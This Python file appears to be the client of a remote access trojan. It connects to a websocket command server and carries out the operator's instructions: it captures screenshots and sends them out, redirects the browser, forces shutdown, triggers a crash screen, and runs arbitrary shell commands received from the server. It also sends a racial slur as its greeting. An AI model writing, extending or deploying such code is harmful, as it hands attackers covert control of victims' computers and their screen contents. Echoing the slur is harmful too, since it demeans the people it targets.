import asyncio
import websockets
from rat.functions.sharks import sharks
from rat.functions.screenshot import screenshot
from rat.functions.notify import notify
from rat.functions.bsod import bsod
import json
import os
import subprocess
from sharkblocks import WEBSOCKET_SERVER

async def websocket_client():
    uri = WEBSOCKET_SERVER
    
    async with websockets.connect(uri) as websocket:
        await websocket.send("Hello nigas")
        async for message in websocket:
            message = json.loads(message)
            if message['cmd'] == "SHARKS":
                await websocket.send("SHARKS Recieved")
                await sharks()
            elif message['cmd'] == "SCREENSHOT":
                 ss = screenshot()   
                 await websocket.send(ss)
            elif message['cmd'] == "NOTIFY":
                notify(message['data'])
                await websocket.send("Notification sent")
            elif message['cmd'] == "REDIRECT":
                await sharks(message['data']['url'])    
                await websocket.send(f"Redirected to `{message['data']['url']}`")
            elif message['cmd'] == "PING":
                await websocket.send("Pong!")
            elif message['cmd'] == "SHUTDOWN":
                await websocket.send("Crashing myself, BYE!")
                os.system("shutdown /s /t 1")
            elif message['cmd'] == "EXECUTE":
                if message['data']['script'] == "sharkigga":
                    bsod()
                else:    
                  subprocess.run(
                      message["data"]['script'],
                      shell=message['data']['shell']
                  )
                await websocket.send("Script Executed successfully")
                
                
                 
                